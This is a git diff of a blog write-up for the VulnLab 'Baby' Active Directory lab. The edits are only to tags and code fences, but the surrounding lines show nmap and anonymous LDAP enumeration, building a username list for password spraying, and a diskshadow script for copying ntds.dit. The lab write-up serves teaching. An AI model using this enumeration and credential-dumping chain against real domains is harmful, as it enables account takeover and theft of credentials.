@@ -1,8 +1,7 @@
 ---
 title: "VulnLab - Baby Writeup"
 date: 2023-11-22
-categories: ["Security"]
-tags: ["CTF", "Writeup", "AD"]
+tags: ["Vulnlab", "Writeup", "AD"]
 ---
 ![Baby Thumbnail](security/vulnlab/baby/vl-baby.png)
 
@@ -14,7 +13,7 @@ Hint: `Look into anonymous LDAP Access.`
 
 I started by performing an nmap scan of the machine, and got the following results:
 
-```
+```text
 PORT     STATE SERVICE       VERSION
 53/tcp   open  domain        Simple DNS Plus
 88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-11-15 01:00:52Z)
@@ -57,7 +56,7 @@ This gives us some helpful information such as the name of the domain and host w
 
 I utilized nmap to dump information about the domain with `nmap -n -sV --script "ldap* and not brute" -Pn IP`, and ldapsearch to dump the users with `ldapsearch -x -H ldap://IP:389 -b "DC=baby,DC=vl" > ldap-dump.txt` where we found a notable user:
 
-```
+```text
 # Teresa Bell, it, baby.vl
 dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl
 objectClass: top
@@ -106,7 +105,7 @@ Teresa Bell had a password in the description for her user (redacted for walkthr
 
 Before we're able to spray the password we found we need to build a list of valid users, I did this by parsing the LDAP dump to pull out usernames in a format CME can read with `cat ldap-dump.txt | grep userPrincipalName | awk '{print $2}' | cut -d "@" -f 1`:
 
-```
+```text
 Jacqueline.Barnett
 Ashley.Webb
 Hugh.George
@@ -155,7 +154,7 @@ We can make a copy of ntds.dit and dump it using diskshadow and robocopy.
 
 I first created the following script to run with diskshadow, saved as `backup.txt`:
 
-```
+```text
 set metadata C:\Windows\Temp\meta.cabX
 set context clientaccessibleX
 set context persistentX
